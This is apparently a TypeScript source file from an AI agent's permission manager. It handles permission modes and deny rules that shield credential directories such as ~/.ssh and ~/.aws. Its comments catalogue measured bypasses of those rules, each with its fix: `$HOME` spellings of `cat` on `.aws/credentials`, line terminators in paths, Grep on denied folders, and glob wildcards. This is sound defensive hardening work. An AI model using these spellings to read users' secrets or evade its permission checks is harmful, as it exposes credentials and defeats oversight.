/**
 * Centralized Permission Mode Manager
 *
 * Manages agent permission modes for tool execution.
 * Each session has its own mode state - no global state contamination.
 *
 * Available Permission Modes:
 * - 'dontAsk': Never prompts; runs pre-approved tools and denies everything else
 * - (F1.1050: the retired 'explore' is read as 'plan' by parsePermissionMode)
 * - 'plan': Read-only planning mode (writes only its .md plan and the session data folder; SubmitPlan allowed)
 * - 'default': Ask for permission on dangerous operations (the manual interactive behavior)
 * - 'acceptEdits': Auto-allow file edits, prompt for shell/network/MCP changes
 * - 'auto': Auto-allow low-risk actions, prompt for risky shell/network/MCP/API changes
 * - 'bypassPermissions': Skip all permission checks (everything allowed)
 */

/// <reference path="../types/incr-regex-package.d.ts" />

import { floorHomeDir } from './mode-manager-home.ts';
import { ALWAYS_ALLOWED_TOOL_NAMES } from './always-allowed-tools.ts';
import { existsSync, realpathSync } from 'fs';
import { debug } from '../utils/debug.ts';
import { isPathWithin } from '../workspaces/paths.ts';
import { CONFIG_DIR } from '../config/paths.ts';
import { encodeSessionKey, type SessionKey } from '../sessions/session-key.ts';
import { dirname, isAbsolute, relative, resolve } from 'path';
import { SESSION_SAFE_ALLOWED_TOOL_NAMES } from '@nessy-agent/session-tools-core';
import { isBrowserToolNameOrAlias, isReadOnlyBrowserToolInput } from './browser-tool-names.ts';
import type { PermissionsContext, MergedPermissionsConfig } from './permissions-config.ts';
import {
  validateBashCommand,
  hasControlCharacters,
  type BashValidationResult,
  type BashValidationReason,
} from './bash-validator.ts';
import {
  validatePowerShellCommand,
  looksLikePowerShell,
  isPowerShellAvailable,
  extractPowerShellWriteTarget,
  powerShellWriteTargetCandidates,
  isWindowsStylePath,
  isWindowsPathWithinDirectory,
  type PowerShellValidationResult,
  type PowerShellValidationReason,
} from './powershell-validator.ts';
import {
  type PermissionMode,
  type ModeConfig,
  type CompiledApiEndpointRule, apiEndpointRuleGrantsTool,
  type CompiledBashPattern,
  type CompiledBlockedCommandHint,
  type MismatchAnalysis,
  type ToolPermissionRule,
  PERMISSION_MODE_ORDER,
  DEFAULT_CYCLABLE_PERMISSION_MODES,
  PERMISSION_MODE_CONFIG,
  SAFE_MODE_CONFIG,
  type PermissionModeCanonical,
  toCanonicalPermissionMode,
  parsePermissionMode,
  clampPermissionModeToParent,
  isInteractiveWritePermissionMode,
  PERMISSION_MODE_AGENT_LABELS,
} from './mode-types.ts';

// Import incr-regex-package for smart pattern mismatch diagnostics
// This library allows character-by-character matching to find WHERE a regex match failed
import { IREGEX, DONE, MORE, FAILED } from 'incr-regex-package';

// Re-export types and config from mode-types (single source of truth)
export {
  type PermissionMode,
  type PermissionModeCanonical,
  type ModeConfig,
  type CompiledApiEndpointRule,
  type CompiledBashPattern,
  type CompiledBlockedCommandHint,
  type MismatchAnalysis,
  PERMISSION_MODE_ORDER,
  DEFAULT_CYCLABLE_PERMISSION_MODES,
  PERMISSION_MODE_CONFIG,
  SAFE_MODE_CONFIG,
  toCanonicalPermissionMode,
  parsePermissionMode,
  clampPermissionModeToParent,
};

// Re-export PowerShell validator types
export {
  type PowerShellValidationResult,
  type PowerShellValidationReason,
  looksLikePowerShell,
  isPowerShellAvailable,
};

/**
 * State for a single session's permission mode
 */
export type PermissionModeChangedBy = 'user' | 'system' | 'restore' | 'automation' | 'unknown';

export interface ModeState {
  /** Session ID */
  sessionId: string;
  /** Current permission mode */
  permissionMode: PermissionMode;
  /** Previous permission mode (if any mode transition has occurred) */
  previousPermissionMode?: PermissionMode;
  /** Monotonic version incremented each time the mode changes */
  modeVersion: number;
  /** ISO timestamp for the last mode change */
  lastChangedAt: string;
  /** Actor that initiated the last mode change */
  lastChangedBy: PermissionModeChangedBy;
  /** Last user-mode modeVersion for which one-turn signal has been consumed */
  lastUserSignalConsumedModeVersion?: number;
  /**
   * P6.202 clause (3) — the session's answer to auto mode's first read outside
   * the working directories.
   *
   * Only `'keep-allowing'` is ever stored, because it is the only answer that
   * SUPPRESSES the prompt: *"Claude Code records your answer so the prompt
   * doesn't appear again"*. **Block from now on** writes a settings key instead
   * (it must survive the session, and every later one), and **Ask again next
   * time** is the absence of a record by definition — *"the next read outside
   * the working directories prompts again"*.
   */
  outsideWorkingDirectoryReads?: 'keep-allowing';
  /** Callback when mode state changes */
  onStateChange?: (state: ModeState) => void;
}

/**
 * Callbacks for mode changes
 */
export interface ModeCallbacks { owner?: object; // F1.397 — the registrant, so {@link unregisterModeCallbacks} removes only its own
  onStateChange?: (state: ModeState) => void;
}

// ============================================================
// Path Matching Utilities
// ============================================================

/**
 * Expand `~` through {@link floorHomeDir} — the LATCHED home, not `os.homedir()`.
 */
function expandHome(path: string): string {
  if (path.startsWith('~/') || path === '~') {
    return path.replace(/^~/, floorHomeDir());
  }
  return path;
}

/**
 * `$HOME` is `~` written the other way round, and this floor read only one of
 * them — P6.673, and it was a hole on all three runtimes at once because
 * {@link shouldAllowToolInMode} is the single entry every backend reaches.
 *
 * Measured 2026-09-07 against the shipped `deniedPaths` with a fake `HOME`,
 * three positive controls REFUSED and two negative controls ALLOWED in the same
 * run: `cat ~/.aws/credentials` was REFUSED while `cat $HOME/.aws/credentials`,
 * `cat "$HOME"/.aws/credentials` and `cat ${HOME}/.aws/credentials` were all
 * ALLOWED. Two spellings a user would call identical gave opposite verdicts.
 *
 * ## Why this is a DENY-SIDE helper and not a change to {@link expandHome}
 *
 * `expandHome` is BIDIRECTIONAL — {@link matchesAllowedWritePath} runs the
 * candidate through it too, and that is a GRANT. Teaching it `$HOME` there
 * would make a grant written `~/x` start matching a request for `$HOME/x`, i.e.
 * a security patch carrying a grant widening in its own diff. This file already
 * splits exactly this way twice ({@link normalizeDeniedPathPattern} and its
 * grant twin {@link normalizeAllowedWritePattern}); this is the third pair
 * member and it is deny-only by construction: nothing else calls it.
 *
 * ## Native mechanism (owner rule 2026-08-28), confirmed at HEAD
 *
 * No runtime has a request-side mechanism that would make this unnecessary, so
 * option (2) applies and the host keeps ONE gate. Claude's own posture is the
 * opposite of resolving the shell — `permissions.md#read-and-edit`: "Read and
 * Edit deny rules apply to Claude's built-in file tools, to file commands
 * Claude Code recognizes in Bash, such as `cat`, `head`, `tail`, and `sed`, and
 * to the targets of Bash redirections such as `> file` and `< file`. They don't
 * apply to arbitrary subprocesses that read or write files indirectly, like a
 * Python or Node script that opens files itself." — and `permissions.md#bash`
 * names a shell variable as a spelling its own Bash rules do not follow
 * ("Variables: `URL=http://github.com && curl $URL`"), pointing at the sandbox
 * or a PreToolUse hook instead. The sandbox is OFF by standing owner decision
 * (2026-08-12/13), so for us this array IS the read-side floor. Codex's answer
 * is its seatbelt/landlock policy, also OS-level and also off here; Pi reaches
 * this same function. Hence: expand the two spellings the user means, and be
 * honest about the rest ({@link unreadableTokenReachesPattern}).
 */
const HOME_VARIABLE_PREFIX = /^\$(?:\{HOME\}|HOME)(?=\/|$)/;

function expandDenyCandidateHome(path: string): string {
  // A function replacement, not a string one: the home is host data and `$&` in
  // a replacement string is a substitution. {@link floorHomeDir}, never `os.homedir()`.
  return expandHome(path.replace(HOME_VARIABLE_PREFIX, () => floorHomeDir()));
}

/**
 * Whether a wildcard this compiler emits may cross a JS line terminator — LF,
 * CR, U+2028 or U+2029, the four characters `.` refuses without the `s` flag.
 *
 * `'stop'` is the historical behaviour and the GRANT-GLOB-NEWLINE decision;
 * `'cross'` is the deny side's. There is deliberately no default: the two
 * directions being ONE token is what produced the bug this parameter fixes.
 */
type GlobTerminatorPolicy = 'cross' | 'stop';

/**
 * Convert a simple glob pattern to a regex
 * Supports: ** (recursive), * (single segment), ? (single char)
 *
 * GRANT-GLOB-NEWLINE, now SPLIT BY DIRECTION (P2.344, closing P2.329's last
 * site). The caller states whether a wildcard may cross a line terminator.
 *
 * ## Why one edit could not fix this — the reason the split exists
 *
 * This compiler is BIDIRECTIONAL. Its six call sites include
 * `matchesAllowedWritePath` (a GRANT) and `matchesDeniedPath` (the `deniedPaths`
 * floor, a DENY carrying `**\/.ssh/**` as a managed lock). A single `s` flag
 * would tighten the second and widen the first in the same token, and the
 * resolved rule is yes-on-deny / no-on-grants — two directions, inexpressible as
 * one flag. Nor could the deny side's two existing pre-steps carry it the way
 * they carried P3.104's container expansion and P3.108's Windows spelling: both
 * rewrite the PATTERN STRING, and terminator-crossing is a property of the
 * COMPILED REGEX, decided here, after any pre-step has already run.
 *
 * ## What was open, measured end-to-end rather than at the matcher
 *
 * Through the real `shouldAllowToolInMode` with the shipped `deniedPaths`
 * (darwin, 2026-08-28): `Read {file_path: '~/.ssh/id_rsa'}` DENIED — the
 * positive control, same run — while `Read {file_path: '~/.ssh/a<LF>b'}` was
 * OPEN, for all four terminators, in `default` and in `bypassPermissions` alike.
 * So an administrator's managed lock was evadable by a line terminator anywhere
 * the `**` or `?` arm had to cross.
 *
 * ## Why the grant keeps `'stop'`, on the documentation rather than on taste
 *
 * `permissions.md#bash`: "The recognized command separators are `&&`, `||`, `;`,
 * `|`, `|&`, `&`, and newlines. A rule must match each subcommand
 * independently." A PERMISSIVE pattern spanning a separator has by definition
 * not matched each subcommand independently.
 * `settings-reference.md#sandbox-excludedcommands` reads the same `Bash(...)`
 * syntax the other way for a prohibition: "When any part of a compound command
 * matches an entry, Claude Code runs the whole command unsandboxed." A deny only
 * ever fires on a superset, which is what
 * `settings-reference.md#permissions-deny` asks it to buy: "Claude Code excludes
 * matching files from file discovery and search results, denies reads of them,
 * and blocks the Edit and Write tools on the matching paths."
 *
 * ## The two tool-name matchers that stay `'stop'` although one of them denies
 *
 * `matchesToolPattern` is BIDIRECTIONAL AT ITS CALL SITES — `allowedTools` and
 * `disallowedTools` are the same function — and `matchesToolPermissionRule`
 * carries a per-rule behavior. Handing a bidirectional seam one flag is exactly
 * the regression `40d03e4a4` had to repair, so they keep today's behaviour and
 * `config/__tests__/grant-glob-newline-policy.test.ts` §2 stays green as the
 * measurement that the grant did not move. `matchesDeniedToolPattern` has one
 * caller and it is a deny, so it takes `'cross'` with it.
 *
 * Note also that the `*` arm (`[^/]*`, a negated class) ALREADY crosses a
 * terminator under BOTH policies, so `'stop'` is a `**`/`?` policy and not a
 * whole-compiler one. Recorded, not endorsed — reconciling it would move a live
 * grant.
 */
function globToRegex(pattern: string, terminators: GlobTerminatorPolicy): RegExp {
  // Expand ~ in pattern
  const expandedPattern = expandHome(pattern);

  // Escape special regex chars except glob wildcards
  let regex = expandedPattern
    .replace(/[.+^${}()|[\]\\]/g, '\\$&')  // Escape regex special chars
    .replace(/\*\*/g, '\0DOUBLE_STAR\0')   // Temporarily replace **
    .replace(/\*/g, '[^/]*')                // * matches single path segment
    .replace(/\0DOUBLE_STAR\0/g, '.*')      // ** matches anything including /
    .replace(/\?/g, '.');                   // ? matches single char

  // `s` makes the `.*` (`**`) and `.` (`?`) arms cross a line terminator. It is
  // the ONLY difference between the two directions, and it is stated at every
  // call site rather than defaulted.
  return new RegExp(`^${regex}$`, terminators === 'cross' ? 's' : '');
}

/**
 * Check if a path matches any of the allowed write path patterns.
 *
 * EXPORTED for the grant-boundary test only — nothing outside this module calls
 * it in production. `allowedWritePaths` is a GRANT compiled by the same
 * bidirectional `globToRegex` as the `deniedPaths` floor, so every change to the
 * deny side has to be shown NOT to have moved this one. Before it was exported,
 * that could only be argued from the source text; now it can be measured
 * (`__tests__/denied-path-windows-separators.test.ts`, §the grant did not move).
 */
export function matchesAllowedWritePath(filePath: string, allowedPaths: string[]): boolean {
  // Normalize path (expand ~, resolve, and use forward slashes)
  const normalizedPath = normalizeForComparison(expandHome(filePath));

  for (const pattern of allowedPaths) {
    try {
      const regex = globToRegex(normalizeAllowedWritePattern(pattern), 'stop');
      if (regex.test(normalizedPath)) {
        debug(`[Mode] Path "${normalizedPath}" matches allowed pattern "${pattern}"`);
        return true;
      }
    } catch (e) {
      debug(`[Mode] Invalid glob pattern "${pattern}":`, e);
    }
  }
  return false;
}

/**
 * The CONTAINER a `<dir>/**` deny entry is about, or `null` for every other
 * pattern shape.
 *
 * `globToRegex('~/.ssh/**')` compiles to `^<home>/\.ssh/.*$`, which requires a
 * slash and at least one more character — so it matches everything INSIDE
 * `~/.ssh` and never `~/.ssh` itself. That is not a cosmetic gap: `Read` takes
 * a file and is covered, but `Grep` and `Glob` take a DIRECTORY, so
 * `Grep(pattern, path: '~/.aws')` handed the search tool the exact directory
 * whose files `Read` refuses, and the tool returns matching lines. Measured at
 * HEAD on 2026-08-28, with `Read('~/.aws/credentials')` denied in the same run
 * as the positive control:
 *   OPEN  Grep  path `~/.ssh`      OPEN  Grep  path `~/.aws`
 *   OPEN  Glob  path `<home>`      OPEN  Bash  `grep -r BEGIN ~/.ssh`
 * Six of the shipped entries have this shape (`~/.ssh/**`, `~/.gnupg/**`,
 * `~/.aws/**`, `~/.config/gcloud/**`, `~/.azure/**`, `~/.kube/**`).
 *
 * The documented semantics are the container-inclusive ones.
 * `permissions.md#read-and-edit`: "**Deny and ask rules**: `Read(secrets/**)`
 * matches a directory named `secrets` at any depth under the current directory,
 * so the rule also applies to nested copies." — the rule matches the DIRECTORY.
 * `settings-reference.md#permissions-deny` says what that has to buy: "Claude
 * Code excludes matching files from file discovery and search results, denies
 * reads of them, and blocks the Edit and Write tools on the matching paths."
 * Discovery and search are the half a container-blind matcher cannot deliver.
 *
 * Why this lives HERE and not in `globToRegex`: that compiler is BIDIRECTIONAL
 * (see its own docstring) — `matchesAllowedWritePath` is a GRANT built from the
 * same function, and widening `X/**` to cover `X` there would hand out write
 * access to the container directory. This helper is reached only from the deny
 * matcher, so the two directions stay independent.
 */
function deniedContainerPattern(pattern: string): string | null {
  if (!pattern.endsWith('/**')) return null;
  const container = pattern.slice(0, -3);
  // `/**` and `**/**` have no container worth denying; the first would deny the
  // filesystem root and the second is already an any-depth match.
  return container.length > 0 && container !== '**' ? container : null;
}

/**
 * Put a `deniedPaths` GLOB into the same spelling `normalizeForComparison` puts
 * the candidate into. Windows only; on every other host this is the identity.
 *
 * ## The defect (P3.108) — THREE causes, and each one alone is sufficient
 *
 * On Windows `expandHome('~/.ssh/**')` splices in `C:\Users\me`, so the pattern
 * carries backslashes. `globToRegex` then ESCAPES each one into a literal
 * backslash. Meanwhile the candidate goes through `normalizeForComparison`,
 * which rewrites its separators to `/` AND lowercases the whole string on
 * win32. The two sides therefore disagree about the separator, about the escape,
 * and about the case:
 *
 *   pattern  `~/.ssh/**`  -> regex `^C:\\Users\\me\/\.ssh\/.*$`
 *   candidate `C:\Users\me\.ssh\id_rsa` -> `c:/users/me/.ssh/id_rsa`  -> NO MATCH
 *
 * Measured 2026-08-28 through the real `shouldAllowToolInMode` with a win32
 * host: TEN of the nineteen shipped entries were inert — every `~/`-anchored
 * one, i.e. the whole tool-owned-dotfile half of the credential floor
 * (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.azure`, `~/.config/gcloud`,
 * `~/.docker/config.json`, both git credential stores, `~/.netrc`). The nine
 * `**\/`-anchored entries were unaffected, because `**\/` never touches homedir.
 * P3.104's container expansion was inert there for the same reason.
 *
 * FIXING ONLY THE SEPARATORS IS NOT ENOUGH, and that is measured rather than
 * assumed: `^C:\/Users\/me\/\.ssh\/.*$` still fails against
 * `c:/users/me/.ssh/id_rsa`. The case fold is an independent third cause, so
 * both transforms have to be mirrored or the entry stays dead.
 *
 * ## Why this is here and NOT in `globToRegex` — the same line P3.104 held
 *
 * `globToRegex` is BIDIRECTIONAL: it also compiles `allowedWritePaths` (a GRANT)
 * and three TOOL-NAME lists. Folding case inside the compiler would make a grant
 * case-insensitive and would break tool matching outright (`Read` is compared
 * against an un-folded tool name). This helper is reached only from the deny
 * matcher, so the deny side can be brought into agreement with the candidate
 * without the grant moving a single path. The grant stays as dead on Windows as
 * it is today — fail-closed, and a separate finding rather than something to fix
 * quietly inside a security patch.
 *
 * ## Why the backslash rewrite is win32-only
 *
 * On Windows a backslash is a separator and cannot appear in a filename, so
 * rewriting it is lossless. On POSIX it is an ordinary filename character, and
 * rewriting it there would turn a deny of the file literally named `a\b` into a
 * deny of `a/b` — a different path. POSIX hosts keep byte-for-byte today's
 * behaviour, which is what makes this change provably platform-local.
 * (A raw pattern the OPERATOR wrote with backslashes never reaches here on any
 * platform: `classifyDeniedPathPattern` drops it with a warning first. The only
 * backslashes this sees are the ones `expandHome` spliced in.)
 */
function normalizeDeniedPathPattern(pattern: string): string {
  const expanded = expandHome(pattern);
  if (process.platform !== 'win32') return expanded;
  return expanded.replace(/\\/g, '/').toLowerCase();
}

/**
 * The GRANT side's mirror of {@link normalizeDeniedPathPattern} — P3.128.
 *
 * **This WIDENS A GRANT on Windows, and that is the whole change.** It is
 * stated here rather than buried because the row exists precisely to make the
 * widening deliberate: P3.108 measured the deny-side defect and refused to fix
 * this one alongside it, on the ground that a security patch must not carry a
 * grant widening in its diff. This commit is the grant widening, on its own,
 * with the probe that measures it already in the tree.
 *
 * What was broken, measured by W2-q at the GATE (not merely at this helper) on
 * a faked-win32 rig, `windows-write-grant-probe.test.ts`: EVERY write grant a
 * Windows user configures was inert, including drive-letter ones. Three
 * independent causes, each sufficient on its own, and the candidate side is
 * where they come from — `normalizeForComparison` rewrites separators AND
 * lowercases on win32, while `globToRegex` knows nothing about the platform:
 *
 *   grant `C:/ws/**`        -> `^C:\/ws\/.*$`
 *   candidate `C:\ws\a.ts`  -> `c:/ws/a.ts`                 -> NO MATCH (case)
 *   grant `~/projects/**`   -> `^C:\\Users\\me\/projects\/.*$`
 *   candidate `C:\Users\me\projects\a.ts`
 *                           -> `c:/users/me/projects/a.ts`  -> NO MATCH (all three)
 *
 * The direction of the OLD behaviour was fail-CLOSED — a Windows user was
 * prompted for writes they had granted — so this is a usability defect being
 * closed, not a hole. The direction of the NEW behaviour is that those grants
 * now work, i.e. writes that used to prompt no longer do. On Windows only.
 *
 * ## What this deliberately does not touch
 *
 * POSIX hosts are byte-identical: the function returns the expanded pattern
 * unchanged off win32, exactly as its deny-side twin does, so no darwin or
 * Linux grant moves by a single path. And it lives HERE rather than inside
 * `globToRegex` for the same reason the deny twin does: that compiler is
 * bidirectional and also compiles three TOOL-NAME lists, where folding case
 * would break `Read` matching outright. Two one-way helpers, no shared
 * behaviour change.
 */
function normalizeAllowedWritePattern(pattern: string): string {
  const expanded = expandHome(pattern);
  if (process.platform !== 'win32') return expanded;
  return expanded.replace(/\\/g, '/').toLowerCase();
}

/**
 * The three ways a `deniedPaths` entry can be written so that it can never
 * match ANY path this matcher will be handed — i.e. the entry denies nothing.
 *
 * `empty`      — blank or whitespace-only.
 * `backslash`  — a Windows-style path. `normalizeForComparison` rewrites every
 *                backslash to `/` on BOTH platforms before comparing, and
 *                `globToRegex` escapes a backslash into a literal, so a pattern
 *                carrying one cannot match anywhere.
 * `unanchored` — the pattern (after `~` expansion) starts with an ordinary
 *                character, e.g. `secrets/**` or `.env`. Candidates are always
 *                absolute by the time they reach the matcher, so such an entry
 *                is dead. `**` is the any-depth anchor these are meant to have.
 */
export type DeniedPathPatternDefect = 'empty' | 'backslash' | 'unanchored';

/**
 * P3.106 — why a `deniedPaths` typo needs a classifier at all.
 *
 * `globToRegex` ESCAPES rather than throws, so the `catch` around it never
 * fires: a malformed entry compiles cleanly into a regex that matches nothing,
 * and the only trace is a `debug()` line that is off unless `NESSY_DEBUG=1`. An
 * administrator's typo in a deny rule therefore denied nothing, silently.
 *
 * The policy is OQ-8's, resolved by the owner 2026-08-27 for permission rules
 * and applied here so the two halves of one product agree: a rule that will not
 * compile is DROPPED whatever its action, with a warning for each.
 * `managed-settings.md#keys-that-fail-closed`: "an individual entry that fails,
 * such as a malformed permission rule, is skipped with a warning while the rest
 * of the file applies."
 *
 * Every class below is provable-inert, not merely suspicious, because a false
 * positive here would DROP A WORKING DENY — the one failure this row must not
 * introduce. Dropping is behaviourally identical to what already happened
 * (these entries matched nothing); the warning is the change.
 */
export function classifyDeniedPathPattern(pattern: string): DeniedPathPatternDefect | null {
  if (pattern.trim().length === 0) return 'empty';
  // Checked on the RAW pattern deliberately. On Windows `expandHome` splices in
  // a `C:\Users\…` home directory, so testing the expanded form would flag
  // every shipped `~/`-anchored entry there.
  if (pattern.includes('\\')) return 'backslash';
  // `~` is only an anchor once expanded; `~notauser/x` is not, and is inert.
  if (!/^[/*?]|^[A-Za-z]:/.test(expandHome(pattern))) return 'unanchored';
  return null;
}

const DENIED_PATH_DEFECT_GUIDANCE: Record<DeniedPathPatternDefect, string> = {
  empty: 'the entry is blank.',
  backslash: 'it is a Windows-style path; write the separators as "/".',
  unanchored: 'it is not anchored; start it with "/", "~/" or "**/".',
};

/**
 * Warn once per distinct pattern, for the same reason
 * `powershell-validator.ts` warns once when its parser script is missing: a
 * permission path that degrades in silence is how this defect survived.
 * `debug()` is off unless `NESSY_DEBUG=1`, and the operator who wrote the typo
 * is exactly the person who never turned it on.
 *
 * The cadence is first-use rather than startup — nothing compiles `deniedPaths`
 * ahead of the first tool check — but the dedupe makes it one line per bad
 * entry per process either way, which is the "with a warning for each" the
 * contract asks for.
 */
const warnedInertDeniedPathPatterns = new Set<string>();

function reportInertDeniedPathPattern(pattern: string, defect: DeniedPathPatternDefect): void {
  if (warnedInertDeniedPathPatterns.has(pattern)) return;
  warnedInertDeniedPathPatterns.add(pattern);
  const message = `[Permissions] deniedPaths entry ${JSON.stringify(pattern)} was dropped: `
    + `${DENIED_PATH_DEFECT_GUIDANCE[defect]} It cannot match any path, so it denies nothing. `
    + 'The remaining deniedPaths entries still apply.';
  console.warn(message);
  debug(message);
}

/**
 * A path SEGMENT this gate cannot read as a name — and the two reasons are NOT
 * the same reason, which is why they are classified rather than merged (P6.673).
 *
 * `expansion` — `$VAR`, `${VAR}`, `$(…)`, a backtick. We deliberately do NOT
 *   resolve these. Resolving `$(…)` and arbitrary variables means implementing a
 *   shell, and a partial resolver is worse than none because it makes the gate
 *   look complete. An expansion can hold any name at all, so it can stand for a
 *   segment a denied pattern spells literally.
 * `glob` — `*`, `?`, `[`. The SHELL resolves these against the real filesystem
 *   before the command runs, so the token as written is not the path that gets
 *   read. A glob can stand for a literal segment only where the shell would let
 *   it, which is the one asymmetry that keeps this from being noisy: bash leaves
 *   `dotglob` OFF, so a wildcard never produces a leading dot. `cat .en*` can
 *   read `.env` and `ls dist/*` cannot.
 */
const SHELL_EXPANSION_CHARS = /[$`]/;
const GLOB_CHARS = /[*?[]/;

function classifyUnreadableSegment(segment: string): 'expansion' | 'glob' | null {
  if (SHELL_EXPANSION_CHARS.test(segment)) return 'expansion';
  if (GLOB_CHARS.test(segment)) return 'glob';
  return null;
}

/**
 * Can this unreadable token segment stand for the name the pattern spells out?
 *
 * Two rules keep this from becoming noise, and both were MEASURED rather than
 * reasoned: without them a false-positive sweep of 25 ordinary agent commands
 * refused 9 of them.
 *
 * 1. **A wildcard never produces a leading dot.** bash leaves `dotglob` off, so
 *    an `ls` of a directory wildcard is not a read of the `.env` beside it,
 *    while a token that spells the dot itself can be.
 * 2. **A wildcard that constrains NOTHING stands for nothing.** A bare star is
 *    the ordinary "every file here" spelling — it is how `cp`, `mv`, `rm`,
 *    `chmod` and `ls` are written — and treating it as a possible `id_rsa` made
 *    every one of those commands a credential access. A glob earns the
 *    substitution only by spelling at least one character of its own, which is
 *    exactly the shape the measured evasions had (a dot-a-star for `.aws`, a
 *    dot-e-n-star for `.env`).
 *
 * Residue, stated rather than papered over: a bare wildcard over a directory
 * that really does contain a denied file still reads it. Closing that needs the
 * FILESYSTEM, not the command string, and this gate deliberately touches
 * neither. It is the sandbox's job, and the sandbox is off by owner decision.
 */
function unreadableSegmentCoversLiteral(segment: string, literal: string): boolean {
  switch (classifyUnreadableSegment(segment)) {
    case 'expansion':
      return true;
    case 'glob':
      if (literal.startsWith('.') && !segment.startsWith('.')) return false;
      if (segment.replace(/\*/g, '').length === 0) return false;
      try {
        return globToRegex(segment, 'cross').test(literal);
      } catch {
        return false;
      }
    default:
      return false;
  }
}

/**
 * Segment-wise: could the path this token denotes be one the pattern denies?
 *
 * This runs ONLY for a candidate that carries an unreadable segment, and it can
 * only ever add a DENY — every literal path keeps the verdict the two regex
 * tests above already gave it, bit for bit.
 *
 * The measured shape of the hole it closes: **the defeat is per-SEGMENT, and it
 * is the segment the pattern spells literally.** `cat …/.aws/cred*` was already
 * REFUSED, because `~/.aws/**` compiles its tail to `.*` and that swallows the
 * `*` character; the same command with the glob moved onto the DIRECTORY
 * segment instead — a star in place of the letters `ws` in `aws` — was ALLOWED,
 * because the pattern requires the literal `aws` and the token does not spell
 * it. So an unreadable token segment is compared against a LITERAL pattern
 * segment only. Where the pattern segment is itself a glob (a star-dot-pem or
 * dot-env-dot-star entry) the original regex comparison stands — that is what
 * keeps an `ls` of a directory wildcard out of the star-dot-pem entry, which a
 * symmetric "wildcard matches wildcard" rule would have refused.
 *
 * (The examples above are spelled in words on purpose: a star followed by a
 * slash inside a block comment CLOSES it — AGENTS.md § Traps, and it cost this
 * lane one parse error.)
 */
function unreadableTokenReachesPattern(tokenSegments: string[], patternSegments: string[]): boolean {
  if (patternSegments.length === 0) return tokenSegments.length === 0;

  const [patternSegment = '', ...restPattern] = patternSegments;

  // `**` spans any number of segments, including none — which is also how the
  // container a `X/**` entry is about (`~/.ssh` for `~/.ssh/**`, P3.104) stays
  // covered here without a second pass.
  if (patternSegment === '**') {
    for (let i = 0; i <= tokenSegments.length; i++) {
      if (unreadableTokenReachesPattern(tokenSegments.slice(i), restPattern)) return true;
    }
    return false;
  }

  if (tokenSegments.length === 0) return false;
  const [tokenSegment = '', ...restToken] = tokenSegments;

  const matched = GLOB_CHARS.test(patternSegment)
    ? matchesGlobSegment(patternSegment, tokenSegment)
    : tokenSegment === patternSegment || unreadableSegmentCoversLiteral(tokenSegment, patternSegment);

  return matched && unreadableTokenReachesPattern(restToken, restPattern);
}

function matchesGlobSegment(pattern: string, value: string): boolean {
  try {
    return globToRegex(pattern, 'cross').test(value);
  } catch {
    return false;
  }
}

function matchesDeniedPath(filePath: string, deniedPaths: string[] | undefined): string | null {
  if (!deniedPaths || deniedPaths.length === 0) return null;

  const normalizedPath = normalizeForComparison(expandDenyCandidateHome(filePath));
  const pathSegments = normalizedPath.split('/');
  const pathIsUnreadable = pathSegments.some((segment) => classifyUnreadableSegment(segment) !== null);

  for (const { pattern, anchored, primary } of deniedPathsWithRealAnchors(deniedPaths, expandHome)) { // F1.1120: each entry, then its real-location spelling
    // Skipped with a warning, per rule, before the compiler is reached — the
    // compiler would accept it and produce a matcher that silently never fires.
    const defect = classifyDeniedPathPattern(pattern);
    if (defect) {
      reportInertDeniedPathPattern(pattern, defect);
      continue;
    }
    try {
      // `normalizeDeniedPathPattern` is the deny side's own spelling step (P3.108)
      // — see its docstring for why it is not inside the bidirectional compiler.
      const regex = globToRegex(normalizeDeniedPathPattern(anchored), 'cross'); // F1.1120: `anchored` is the expanded original on the primary entry, the re-anchored spelling on the second
      if (regex.test(normalizedPath)) {
        debug(`[Mode] Path "${normalizedPath}" matches denied pattern "${pattern}"`);
        return pattern;
      }
      // The container the entry is about. Reported under the ORIGINAL pattern so
      // the refusal message names the line the operator actually wrote.
      const container = deniedContainerPattern(anchored); // F1.1120: the re-anchored spelling's container is denied by the operator's own line
      if (container && globToRegex(normalizeDeniedPathPattern(container), 'cross').test(normalizedPath)) {
        debug(`[Mode] Path "${normalizedPath}" is the container denied by "${pattern}"`);
        return pattern;
      }
      // P6.673 — the two tests above read the token as the literal path it is.
      // A token the shell has not finished writing yet is not that path, so
      // they answer about a string nobody will ever open. Gated on
      // `pathIsUnreadable` so a literal candidate never reaches a second, looser
      // comparison.
      if (pathIsUnreadable && primary // F1.1120: the heuristic runs once per operator entry, not per spelling of it
        && unreadableTokenReachesPattern(pathSegments, normalizeDeniedPathPattern(pattern).split('/'))) {
        debug(`[Mode] Path "${normalizedPath}" could not be resolved and may denote "${pattern}"`);
        return pattern;
      }
    } catch (e) {
      debug(`[Mode] Invalid denied path glob "${pattern}":`, e);
    }
  }

  return null;
}

/**
 * One credential root a `~`-anchored `deniedPaths` glob cannot reach — P6.678.
 *
 * `origin` is the environment variable that moved it, and it is what the
 * refusal names: a user told "matched deniedPaths pattern `~/.config/gh/**`"
 * for a file under `/opt/gh` would look for a rule that is not the one that
 * fired.
 */
interface RelocatedCredentialRoot {
  readonly root: string;
  readonly origin: string;
}

/**
 * The request-side floor's answer to a RELOCATED credential directory.
 *
 * `SAFE_MODE_CONFIG.deniedPaths` is a static array of globs, and its own
 * comment records the residue this closes: *"`$GH_CONFIG_DIR`,
 * `$GLAB_CONFIG_DIR`, a relocated `$XDG_CONFIG_HOME` and `$XDG_CONFIG_DIRS` are
 * unreachable from a `~`-anchored glob, so a host that relocates either CLI's
 * config keeps a readable token."* The sandbox floor never had that problem
 * because `credentialDenyRoots(homeDir, configDir)`
 * (`session-tools-core/src/runtime/credential-deny-roots.ts`) is a FUNCTION that
 * takes its roots; this is the same shape for the request side, and it is the
 * floor that matters, because isolation is off by default (standing owner
 * decision 2026-08-12/13).
 *
 * ## Containment, not a synthesised glob
 *
 * A relocated root is a literal path, and turning one into a `<dir>/**` entry
 * would run it through `globToRegex` — where a `[`, a `*` or a `?` in the
 * directory name makes the pattern mean something else, or throw and be caught
 * into silence by `matchesDeniedPath`'s own `catch`. A silently inert entry on a
 * credential root is worse than no entry, because it reads as covered. So the
 * comparison is `isPathWithin`, which resolves the path and its root and
 * follows symlinks, and no glob is built at all.
 *
 * ## Which variables, and read from the SOURCE
 *
 * `cli/go-gh/pkg/config/config.go` — *"Config path precedence: GH_CONFIG_DIR,
 * XDG_CONFIG_HOME, AppData (windows only), HOME"* — so `$GH_CONFIG_DIR` IS
 * gh's config directory (it holds `hosts.yml` directly) while
